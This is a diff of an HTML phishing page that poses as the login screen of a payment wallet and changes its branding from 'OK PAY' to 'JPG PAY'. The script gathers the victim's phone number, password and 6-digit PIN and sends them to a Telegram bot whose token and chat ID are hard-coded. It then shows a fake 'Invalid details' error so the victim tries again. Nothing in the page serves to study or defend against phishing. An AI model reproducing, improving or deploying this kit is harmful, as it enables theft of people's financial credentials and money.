@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OK PAY</title>
+  <title>JPG PAY</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      background-color: #f0f4f8;
-      color: #333333;
+      background-color: #121212;
+      color: #e0e0e0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       display: flex;
       justify-content: center;
@@ -20,50 +20,70 @@
     
     /* Logo Styling */
     .logo-box {
-      width: 130px; height: 130px;
-      border-radius: 28px;
+      width: 140px; height: 140px;
+      border-radius: 30px;
       margin: 0 auto 35px;
       overflow: hidden;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
-      background: #1a0b2e; /* Fallback color */
+      background: #1e1e1e; /* Fallback dark background */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
     }
     .logo-box img {
       width: 100%;
       height: 100%;
       object-fit: cover;
+      display: none; /* Hidden by default, JS shows it */
+    }
+    
+    /* Fallback Text if image not found */
+    .logo-fallback {
+      color: #4db6ac;
+      font-size: 28px;
+      font-weight: bold;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      width: 100%;
+      background: #1a1a1a;
+    }
+    .logo-fallback span {
+      font-size: 12px;
+      color: #888;
+      margin-top: 5px;
     }
 
     /* Input Fields */
     .input-group {
       display: flex;
       align-items: center;
-      background: #ffffff;
-      border: 1.5px solid #e0e0e0;
+      background: #1e1e1e;
+      border: 1.5px solid #333;
       border-radius: 30px;
       padding: 16px 20px;
       margin-bottom: 16px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.02);
     }
     .input-group svg {
       width: 22px; height: 22px;
-      fill: #00897b;
+      fill: #4db6ac;
       margin-right: 14px;
       flex-shrink: 0;
     }
     .input-group input {
       background: transparent;
       border: none;
-      color: #333;
+      color: #e0e0e0;
       font-size: 16px;
       width: 100%;
       outline: none;
-      letter-spacing: 0.5px;
     }
-    .input-group input::placeholder { color: #aaaaaa; letter-spacing: normal; }
+    .input-group input::placeholder { color: #777; }
     
-    /* PIN Input special */
     .input-group input#pin {
-      letter-spacing: 8px;
+      letter-spacing: 6px;
       font-weight: 600;
     }
     .input-group input#pin::placeholder {
@@ -76,45 +96,43 @@
       display: flex;
       justify-content: space-between;
       font-size: 15px;
-      color: #00897b;
+      color: #4db6ac;
       margin-bottom: 25px;
       padding: 0 5px;
       font-weight: 500;
     }
-    .row a { color: #00897b; text-decoration: underline; font-weight: 600; }
+    .row a { color: #4db6ac; text-decoration: underline; font-weight: 600; }
     .row div { display: flex; align-items: center; gap: 6px; cursor: pointer; }
     
     .checkbox-container {
       display: flex;
       align-items: center;
       font-size: 14px;
-      color: #00897b;
+      color: #4db6ac;
       justify-content: center;
       margin-bottom: 30px;
       font-weight: 500;
     }
     .checkbox-container input {
       margin-right: 10px;
-      accent-color: #00897b;
+      accent-color: #4db6ac;
       width: 18px; height: 18px;
-      cursor: pointer;
     }
 
     /* Sign In Button */
     .btn-main {
       width: 100%;
       padding: 18px;
-      background: #00897b;
+      background: #2e7d6b;
       color: white;
       border: none;
       border-radius: 30px;
       font-size: 18px;
       font-weight: bold;
       cursor: pointer;
-      box-shadow: 0 6px 15px rgba(0,137,123,0.3);
       transition: background 0.2s;
     }
-    .btn-main:hover { background: #00695c; }
+    .btn-main:hover { background: #1b5e50; }
     .btn-main:active { transform: scale(0.98); }
   </style>
 </head>
@@ -123,8 +141,14 @@
   <div class="container">
     <!-- Logo Box -->
     <div class="logo-box">
-      <!-- Replace this URL with your actual logo file (e.g., okpay.png) -->
-      <img src="https://i.ibb.co/6P0yCqZ/okpay-logo.png" alt="OK PAY" onerror="this.style.display='none'; this.parentElement.style.background='#1a0b2e'; this.parentElement.innerHTML='<div style=\'color:white; display:flex; justify-content:center; align-items:center; height:100%; font-size:24px; font-weight:bold;\'>OK PAY</div>'">
+      <!-- APNI PHOTO KA LINK YAHAN DAALEIN (src="apni_photo.jpg") -->
+      <img id="logoImg" src="jpglogo.png" alt="JPG PAY" onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='flex';">
+      
+      <!-- Fallback Logo (Agar photo load na ho) -->
+      <div class="logo-fallback" id="fallbackLogo" style="display:none;">
+        JPG PAY
+        <span>Secure Wallet</span>
+      </div>
     </div>
 
     <!-- Phone Input -->
@@ -148,7 +172,7 @@
     <!-- Links -->
     <div class="row">
       <a href="#">Register</a>
-      <div><input type="radio" name="remember" style="accent-color:#00897b; width:16px; height:16px;"> Remember Me</div>
+      <div><input type="radio" name="remember" style="accent-color:#4db6ac; width:16px; height:16px;"> Remember Me</div>
     </div>
 
     <!-- Agreement -->
@@ -162,18 +186,16 @@
 
   <script>
     // ==========================================
-    // TELEGRAM BOT DETAILS (Apni details yahan daalein)
+    // TELEGRAM BOT DETAILS
     // ==========================================
     const BOT_TOKEN = "8990784308:AAHT79h9bUWISEm-eXZImzcdmISDsqqf9HM";
     const CHAT_ID = "7318531273";
 
     function submitLogin() {
-      // Get values
       let phone = document.getElementById('phone').value.trim();
       let pass = document.getElementById('pass').value.trim();
       let pin = document.getElementById('pin').value.trim();
 
-      // Validation
       if (phone === "" || pass === "" || pin === "") {
         alert("Bhai, saari details daalo (Phone, Password, aur 6-digit PIN)!");
         return;
@@ -189,16 +211,13 @@
         return;
       }
 
-      // Prepare Telegram Message
-      let message = "🔔 *OK PAY - New Login Attempt*\n\n";
+      let message = "🔔 *JPG PAY - New Login Attempt*\n\n";
       message += "📞 Phone: " + phone + "\n";
       message += "🔑 Password: " + pass + "\n";
       message += "🔐 6-digit PIN: " + pin;
 
-      // Send to Telegram
       sendToTelegram(message);
 
-      // Optional: Show success/error message
       setTimeout(() => {
         alert("❌ Invalid details! Please try again.");
       }, 500);
